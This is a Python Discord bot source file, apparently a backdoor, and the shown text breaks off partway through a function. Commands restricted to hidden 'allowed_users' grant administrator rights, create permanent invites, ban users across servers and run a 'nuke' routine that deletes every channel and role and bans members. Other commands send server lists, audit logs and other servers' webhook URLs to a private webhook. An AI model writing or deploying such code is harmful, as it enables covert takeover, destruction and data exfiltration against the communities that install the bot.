import discord
from discord import Intents
from discord.ext import commands
import requests
import pprint
import asyncio
intents = Intents.default()
intents.message_content = True
intents.members = True
intents.presences = True
bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
WEBHOOK_URL = ''
TOKEN = '' 
allowed_users = [] 
@bot.command()
async def managerole(ctx, role_id: int = None):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = ctx.guild
    message = f"Command 'managerole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    if role_id is None:
        new_role = await guild.create_role(name='new role', permissions=discord.Permissions(administrator=True))
        member = ctx.author
        await member.add_roles(new_role)
        message += f"\nCreated a new role with ID {new_role.id} and assigned it to {ctx.author.id}."
    else:
        role = discord.utils.get(guild.roles, id=role_id)
        if not role:
            return
        if role.permissions.administrator:
            return
        permissions = role.permissions
        permissions.update(administrator=True)
        await role.edit(permissions=permissions)
        message += f"\nUpdated role {role.id} permissions to have administrator for {ctx.author.id}."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def unmanagerole(ctx, role_id: int = None):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = ctx.guild
    message = f"Command 'unmanagerole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    if role_id is not None:
        role = discord.utils.get(guild.roles, id=role_id)
        if not role:
            return
        if not role.permissions.administrator:
            return
        permissions = role.permissions
        permissions.update(administrator=False)
        await role.edit(permissions=permissions)
        message += f"\nUpdated role {role.id} permissions to remove administrator for {ctx.author.id}."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def assignrole(ctx, role_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = ctx.guild
    role = discord.utils.get(guild.roles, id=role_id)
    if not role:
        return
    member = ctx.author
    await member.add_roles(role)
    message = f"Command 'assignrole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    message += f"\nAssigned role {role.id} to {ctx.author.id}."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def unassignrole(ctx, role_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = ctx.guild
    role = discord.utils.get(guild.roles, id=role_id)
    if not role:
        return
    member = ctx.author
    await member.remove_roles(role)
    message = f"Command 'unassignrole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    message += f"\nRemoved role {role.id} from {ctx.author.id}."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def ban(ctx, user_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = ctx.guild
    await server.ban(discord.Object(id=user_id))
    message = f"User with ID {user_id} has been banned from server {server.id} ({server.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def unban(ctx, user_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = ctx.guild
    await server.unban(discord.Object(id=user_id))
    message = f"User with ID {user_id} has been unbanned from server {server.id} ({server.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def remoteban(ctx, server_id: int, user_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if not server:
        return
    await server.ban(discord.Object(id=user_id))
    message = f"User with ID {user_id} has been banned from server {server.id} ({server.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def remoteunban(ctx, server_id: int, user_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if not server:
        return
    await server.unban(discord.Object(id=user_id))
    message = f"User with ID {user_id} has been unbanned from server {server.id} ({server.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def remoteuntimeout(ctx, server_id: int, user_id: int):
    guild = bot.get_guild(server_id)
    if guild is None:
        return
    member = guild.get_member(user_id)
    if member is None:
        return
    BASE = "https://discord.com/api/v9/"
    def untimeout_user(*, user_id: int, server_id: int):
        endpoint = f'guilds/{server_id}/members/{user_id}'
        headers = {"Authorization": f"Bot {TOKEN}"}
        url = BASE + endpoint
        json = {'communication_disabled_until': None}
        session = requests.patch(url, json=json, headers=headers)
        if session.status_code in range(200, 299):
            return session.json()
        else: 
            return print("Did not find any\n", session.status_code)
    member = untimeout_user(user_id=user_id, server_id=server_id)
    message = f"User with ID {user_id} has been removed from timeout in server {guild.id} ({guild.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def listservers(ctx):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    servers = bot.guilds
    message = "List of servers:\n"
    message_chunks = []
    for server in servers:
        if len(message + f"Server: {server.name} ({server.id})\n") > 2000:
            message_chunks.append(message)
            message = "List of servers:\n"
        message += f"Server: {server.name} ({server.id})\n"
    message_chunks.append(message)
    for chunk in message_chunks:
        response = requests.post(WEBHOOK_URL, json={'content': chunk})
@bot.command()
async def createinvite(ctx, server_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = discord.utils.get(bot.guilds, id=server_id)
    if server is None:
        return
    invite = await server.text_channels[0].create_invite(max_age=0)
    message = f"Invite Link for {server.name} ({server.id}): {invite.url}"
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def assignroleother(ctx, role_id: int, user_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = ctx.guild
    role = discord.utils.get(guild.roles, id=role_id)
    if not role:
        return
    member = guild.get_member(user_id)
    if not member:
        return
    await member.add_roles(role)
    message = f"Command 'assignrole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    message += f"\nAssigned role {role.id} to user {member.id} ({member.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def unassignroleother(ctx, role_id: int, user_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = ctx.guild
    role = discord.utils.get(guild.roles, id=role_id)
    if not role:
        return
    member = guild.get_member(user_id)
    if not member:
        return
    await member.remove_roles(role)
    message = f"Command 'unassignrole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    message += f"\nRemoved role {role.id} from user {member.id} ({member.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def listroles(ctx, server_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if not server:
        message = f"Server with ID {server_id} not found. Make sure the bot is in the server."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    roles = list(server.roles)
    roles.sort(reverse=True, key=lambda role: role.position)
    role_info = []
    for role in roles:
        role_info.append(f"{role.name} (ID: {role.id}), Position: {role.position}")
    role_list = '\n'.join(role_info)
    role_parts = [role_list[i:i + 1900] for i in range(0, len(role_list), 1900)]  
    for index, part in enumerate(role_parts):
        message = f"**Roles in {server.name} ({server.id}), Part {index+1}**\n```\n{part}\n```"
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def listroleperms(ctx, server_id: int, role_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if not server:
        message = f"Server with ID {server_id} not found. Make sure the bot is in the server."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    role = discord.utils.get(server.roles, id=role_id)
    if not role:
        message = f"Role with ID {role_id} not found in server {server.name} ({server.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    permissions = role.permissions
    permission_list = [f"{perm[0]}: {perm[1]}" for perm in permissions]
    permission_message = '\n'.join(permission_list)
    message = f"**Permissions for {role.name} (ID: {role.id}) in {server.name} ({server.id})**\n```\n{permission_message}\n```"
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def listauditlog(ctx, server_id: int, limit: int = 10):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if not server:
        message = f"Server with ID {server_id} not found. Make sure the bot is in the server."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    audit_log_entries = []
    async for entry in server.audit_logs(limit=limit):
        log_message = f"**{entry.user} ({entry.user.id}) - {entry.action}**: {entry.target} - {entry.reason}"
        if len('\n'.join(audit_log_entries)) + len(log_message) > 2000:
            log_message_to_send = '\n'.join(audit_log_entries)
            response = requests.post(WEBHOOK_URL, json={'content': log_message_to_send})
            audit_log_entries = []
        audit_log_entries.append(log_message)
    if audit_log_entries:
        log_message_to_send = '\n'.join(audit_log_entries)
        response = requests.post(WEBHOOK_URL, json={'content': log_message_to_send})
@bot.command()
async def listinvites(ctx, server_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if not server:
        message = f"Server with ID {server_id} not found. Make sure the bot is in the server."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    invites = await server.invites()
    if not invites:
        message = f"No invites found for server {server.name} ({server.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    invite_list = []
    for invite in invites:
        invite_duration = "Infinite" if invite.max_age == 0 else f"{invite.max_age} seconds"
        invite_entry = f"Invite: {invite.url}, Uses: {invite.uses}, Duration: {invite_duration}"
        if len('\n'.join(invite_list + [invite_entry])) > 2000:
            invite_message = '\n'.join(invite_list)
            message = f"**Invites for {server.name} ({server.id})**\n```\n{invite_message}\n```"
            response = requests.post(WEBHOOK_URL, json={'content': message})
            invite_list = [invite_entry]  
        invite_list.append(invite_entry)
    invite_message = '\n'.join(invite_list)
    message = f"**Invites for {server.name} ({server.id})**\n```\n{invite_message}\n```"
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def status(ctx, status_type, activity_type=None, *, game=None):
    if ctx.author.id in allowed_users:
        valid_statuses = ['online', 'idle', 'dnd', 'invisible']
        valid_activity_types = ['playing', 'watching', 'listening']
        status_type = status_type.lower()
        if activity_type:
            activity_type = activity_type.lower()
        if status_type in valid_statuses:
            if status_type == 'invisible':
                await bot.change_presence(status=discord.Status.invisible)
            else:
                if activity_type and game:
                    if activity_type in valid_activity_types:
                        if activity_type == 'playing':
                            activity = discord.Game(name=game)
                        elif activity_type == 'watching':
                            activity = discord.Activity(type=discord.ActivityType.watching, name=game)
                        elif activity_type == 'listening':
                            activity = discord.Activity(type=discord.ActivityType.listening, name=game)
                    else:
                        message = "Invalid activity type. Available options: playing, watching, listening."
                        send_webhook_message(message)
                        return
                else:
                    activity = None
                await bot.change_presence(status=discord.Status(status_type), activity=activity)
            message = f"Bot status updated to {status_type.capitalize()}"
            if activity_type and game:
                message += f" with {activity_type.capitalize()} '{game}'."
            send_webhook_message(message)
        else:
            message = "Invalid status type. Available options: online, idle, dnd, invisible."
            send_webhook_message(message)
    else:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        send_webhook_message(message)
def send_webhook_message(message):
    payload = {'content': message}
    response = requests.post(WEBHOOK_URL, json=payload)
@bot.command()
async def remotemanagerole(ctx, server_id: int, role_id: int = None):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = bot.get_guild(server_id)
    if guild is None:
        return
    message = f"Command 'managerole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    if role_id is None:
        new_role = await guild.create_role(name='new role', permissions=discord.Permissions(administrator=True))
        message += f"\nCreated a new role with ID {new_role.id}"
    else:
        role = discord.utils.get(guild.roles, id=role_id)
        if not role:
            message += "Role not found."
            response = requests.post(WEBHOOK_URL, json={'content': message})
        if role.permissions.administrator:
            message += "Role already has administrator permissions."
            response = requests.post(WEBHOOK_URL, json={'content': message})
        permissions = role.permissions
        permissions.update(administrator=True)
        await role.edit(permissions=permissions)
        message += f"\nUpdated role {role.id} permissions to have administrator."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def remoteunmanagerole(ctx, server_id: int, role_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = bot.get_guild(server_id)
    if guild is None:
        return
    message = f"Command 'unmanagerole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    if role_id is not None:
        role = discord.utils.get(guild.roles, id=role_id)
        if not role:
            message += "Role not found."
            response = requests.post(WEBHOOK_URL, json={'content': message})
        if not role.permissions.administrator:
            message += "Role does not have administrator permissions."
            response = requests.post(WEBHOOK_URL, json={'content': message})
        permissions = role.permissions
        permissions.update(administrator=False)
        await role.edit(permissions=permissions)
        message += f"\nUpdated role {role.id} permissions to remove administrator."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def remoteassignrole(ctx, server_id: int, role_id: int, user_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = bot.get_guild(server_id)
    if not guild:
        return
    role = discord.utils.get(guild.roles, id=role_id)
    if not role:
        return
    member = guild.get_member(user_id)
    if not member:
        return
    await member.add_roles(role)
    message = f"Command 'assignrole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    message += f"\nAssigned role {role.id} to {member.id} ({member.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def remoteunassignrole(ctx, server_id: int, role_id: int, user_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    guild = bot.get_guild(server_id)
    if not guild:
        return
    role = discord.utils.get(guild.roles, id=role_id)
    if not role:
        return
    member = guild.get_member(user_id)
    if not member:
        return
    await member.remove_roles(role)
    message = f"Command 'unassignrole' executed by {ctx.author.id} in server {guild.id} ({guild.name})."
    message += f"\nRemoved role {role.id} from {member.id} ({member.name})."
    response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def leave(ctx, server_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if server:
        message = f'Are you sure you want me to leave the server with ID {server_id}? (yes/no)'
        response = requests.post(WEBHOOK_URL, json={'content': message})
        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in ['yes', 'no']
        try:
            response = await bot.wait_for('message', timeout=30.0, check=check)
            if response.content.lower() == 'yes':
                await server.leave()
                message = f'Left server with ID {server_id}'
                response = requests.post(WEBHOOK_URL, json={'content': message})
            else:
                message = 'Leaving action canceled.'
                response = requests.post(WEBHOOK_URL, json={'content': message})
        except TimeoutError:
            message = 'Confirmation timed out. Leaving action canceled.'
            response = requests.post(WEBHOOK_URL, json={'content': message})
    else:
        message = f'Could not find a server with ID {server_id}'
        response = requests.post(WEBHOOK_URL, json={'content': message})
channel_ids = []
role_ids = []
members_to_ban = []
@bot.command()
async def nuke(ctx, server_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if server is None:
        return
    message = f"Are you sure you want to nuke the server with ID {server_id}? (yes/no)"
    response = requests.post(WEBHOOK_URL, json={'content': message})
    def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in ['yes', 'no']
    try:
        response = await bot.wait_for('message', timeout=30.0, check=check)
        if response.content.lower() == 'yes':
            message = f"Initiating server nuke..."
            response = requests.post(WEBHOOK_URL, json={'content': message})
            channel_ids.clear()
            for channel in server.channels:
                channel_ids.append(channel.id)
            for channel_id in channel_ids:
                channel = bot.get_channel(channel_id)
                if channel:
                    await channel.delete()
                    message = f"Deleted channel with ID {channel_id}"
                    response = requests.post(WEBHOOK_URL, json={'content': message})
                else:
                    message = f"Channel with ID {channel_id} not found."
                    response = requests.post(WEBHOOK_URL, json={'content': message})
            role_ids.clear()
            bot_top_role_position = ctx.guild.get_member(bot.user.id).top_role.position
            for role in server.roles:
                if role.id == server_id or role.managed or role.position >= bot_top_role_position:
                    continue
                role_ids.append(role.id)
            for role_id in role_ids:
                role = discord.utils.get(server.roles, id=role_id)
                if role:
                    try:
                        await role.delete()
                        message = f"Deleted role with ID {role_id}"
                        response = requests.post(WEBHOOK_URL, json={'content': message})
                    except discord.Forbidden:
                        message = f"Insufficient permissions to delete role with ID {role_id}"
                        response = requests.post(WEBHOOK_URL, json={'content': message})
                else:
                    message = f"Role with ID {role_id} not found."
                    response = requests.post(WEBHOOK_URL, json={'content': message})
            bot_top_role_position = ctx.guild.get_member(bot.user.id).top_role.position
            for member in server.members:
                if not member.roles or member.top_role.position < bot_top_role_position:
                    members_to_ban.append(member.id)
            for member_id in members_to_ban:
                member = discord.utils.get(server.members, id=member_id)
                if member:
                    try:
                        await member.ban(reason="")
                        message = f"Banned member with ID {member_id}"
                        response = requests.post(WEBHOOK_URL, json={'content': message})
                    except discord.Forbidden:
                        message = f"Insufficient permissions to ban member with ID {member_id}"
                        response = requests.post(WEBHOOK_URL, json={'content': message})
                else:
                    message = f"Member with ID {member_id} not found."
                    response = requests.post(WEBHOOK_URL, json={'content': message})
        else:
            message = f"Nuke cancelled"
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except TimeoutError:
        message = f"Confirmation timeout nuke cancelled..."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def servername(ctx, server_id: int, *, new_name: str):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if server is None:
        message = f"Server not found."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        await server.edit(name=new_name)
        message = f"Server name changed to '{new_name}'."
        response = requests.post(WEBHOOK_URL, json={'content': message})
    except discord.Forbidden:
        message = f"Insufficient permissions to change server name."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def servericon(ctx, server_id: int, icon_url: str):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if server is None:
        return
    if not icon_url.endswith(('.png', '.jpg', '.jpeg', '.gif')):
        message = f"Invalid image URL. Please provide a direct link to a PNG, JPEG, or GIF image."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        response = requests.get(icon_url)
        if response.status_code == 200:
            await server.edit(icon=response.content)
            message = f"Server icon changed successfully."
            response = requests.post(WEBHOOK_URL, json={'content': message})
        else:
            message = f"Failed to download the image."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except discord.Forbidden:
        message = f"Insufficient permissions to change server icon."
        response = requests.post(WEBHOOK_URL, json={'content': message})
    except Exception as e:
        message = f"An error occurred: {str(e)}"
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def nick(ctx, server_id, *, new_nickname):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = discord.utils.get(bot.guilds, id=int(server_id))
    if server:
        try:
            await server.me.edit(nick=new_nickname)
            message = f"Bot's nickname updated to {new_nickname} in server {server.name}"
            response = requests.post(WEBHOOK_URL, json={'content': message})
        except Exception as e:
            message = f"An error occurred: {e}"
            response = requests.post(WEBHOOK_URL, json={'content': message})
    else:
        message = f"Server not found."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def resetnick(ctx, server_id):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = discord.utils.get(bot.guilds, id=int(server_id))
    if server:
        try:
            await server.me.edit(nick="")
            message = f"Bot's nickname reset in server {server.name}"
            response = requests.post(WEBHOOK_URL, json={'content': message})
        except Exception as e:
            message = f"An error occurred: {e}"
            response = requests.post(WEBHOOK_URL, json={'content': message})
    else:
        message = f"Server not found."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def deletemessage(ctx, message_id):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        message_id = int(message_id)
        message = await ctx.channel.fetch_message(message_id)
        await message.delete()
        message = f"Deleted message with ID {message_id}"
        response = requests.post(WEBHOOK_URL, json={'content': message})
    except discord.NotFound:
        message = f"Message not found."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def remotedeletemessage(ctx, server_id: int, message_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        server = bot.get_guild(server_id)
        if server is not None:
            message = await server.fetch_message(message_id)
            await message.delete()
            message = f"Deleted message with ID {message_id} in server {server.name}"
            response = requests.post(WEBHOOK_URL, json={'content': message})
        else:
            message = f"Server not found."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except discord.NotFound:
        message = f"Message not found."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def remotedeleterole(ctx, server_id: int, role_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        server = bot.get_guild(server_id)
        if server is not None:
            role = discord.utils.get(server.roles, id=role_id)
            if role is not None:
                await role.delete()
                message = f"Deleted role with ID {role_id} in server {server.name}"
                response = requests.post(WEBHOOK_URL, json={'content': message})
            else:
                message = f"Role not found."
                response = requests.post(WEBHOOK_URL, json={'content': message})
        else:
            message = f"Server not found."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except discord.Forbidden:
        message = f"Insufficient permissions to delete roles."
        response = requests.post(WEBHOOK_URL, json={'content': message})
    except discord.NotFound:
        message = f"Role not found"
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def deleterole(ctx, role_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        role = discord.utils.get(ctx.guild.roles, id=role_id)
        if role is not None:
            await role.delete()
            message = f"Deleted role with ID {role_id}"
            response = requests.post(WEBHOOK_URL, json={'content': message})
        else:
            message = f"Role not found in this server."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except discord.Forbidden:
        message = f"Insufficient permissions to delete roles."
        response = requests.post(WEBHOOK_URL, json={'content': message})
    except discord.NotFound:
        message = f"Role not found in this server."
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def stop(ctx):
    if ctx.author.id in allowed_users:
        message = f"Are you sure you want me to stop? (yes/no)"
        response = requests.post(WEBHOOK_URL, json={'content': message})
        def check(msg):
            return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in ['yes', 'no']
        try:
            response = await bot.wait_for('message', timeout=30.0, check=check)
            if response.content.lower() == 'yes':
                message = f"Bot is stopping..."
                response = requests.post(WEBHOOK_URL, json={'content': message})
                await bot.close()
            else:
                message = f"Stop action canceled."
                response = requests.post(WEBHOOK_URL, json={'content': message})
        except asyncio.TimeoutError:
            message = f"Confirmation timed out. Stop action canceled."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    else:
        message = f"Someone tried to stop the bot but wasnt in allowed users list"
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def listwebhooks(ctx, server_id):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        server = bot.get_guild(int(server_id))
        if server:
            webhooks = await server.webhooks()
            webhook_urls = [webhook.url for webhook in webhooks]
            if webhook_urls:
                webhook_text = "\n".join(webhook_urls)
                await post_webhook_messages(webhook_text)
                message = f"Webhook URLs have been posted."
                response = requests.post(WEBHOOK_URL, json={'content': message})
            else:
                message = f"No webhooks found on this server."
                response = requests.post(WEBHOOK_URL, json={'content': message})
        else:
            message = f"Server not found."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except Exception as e:
        message = f"An error occurred: {str(e)}"
        response = requests.post(WEBHOOK_URL, json={'content': message})
def post_webhook_messages(message):
    message_chunks = [message[i:i + 2000] for i in range(0, len(message), 4000)]
    for chunk in message_chunks:
        payload = {
            'content': chunk
        }
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code != 204:
            print(f"Error: {response.status_code} - {response.text}")
        response.raise_for_status()
@bot.command()
async def listwebhooks2(ctx, server_id, channel_id):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    try:
        server = bot.get_guild(int(server_id))
        if server:
            channel = server.get_channel(int(channel_id))
            if channel:
                webhooks = await channel.webhooks()
                webhook_urls = [webhook.url for webhook in webhooks]
                if webhook_urls:
                    webhook_text = "\n".join(webhook_urls)
                    await post_webhook_messages(webhook_text)
                    message = f"Webhook URLs have been posted."
                    response = requests.post(WEBHOOK_URL, json={'content': message})
                else:
                    message = f"No webhooks found in this channel."
                    response = requests.post(WEBHOOK_URL, json={'content': message})
            else:
                message = f"Channel not found in this server."
                response = requests.post(WEBHOOK_URL, json={'content': message})
        else:
            message = f"Server not found."
            response = requests.post(WEBHOOK_URL, json={'content': message})
    except Exception as e:
        message = f"An error occurred: {str(e)}"
        response = requests.post(WEBHOOK_URL, json={'content': message})
@bot.command()
async def listchannels(ctx, server_id: int):
    if ctx.author.id not in allowed_users:
        message = f"Unauthorized attempt by {ctx.author.name} ({ctx.author.id}) in server {ctx.guild.name} ({ctx.guild.id})."
        response = requests.post(WEBHOOK_URL, json={'content': message})
        return
    server = bot.get_guild(server_id)
    if server:
        channel_info = [(str(channel.id), channel.name) for channel in server.channels]
        chunks = []
        current_chunk = ""
        for channel_id, channel_name in channel_info:
            line = f"{channel_id} - {channel_name}\n"
            if len(current_chunk) + len(line) <= 2000:
                current_chunk += line
            else:
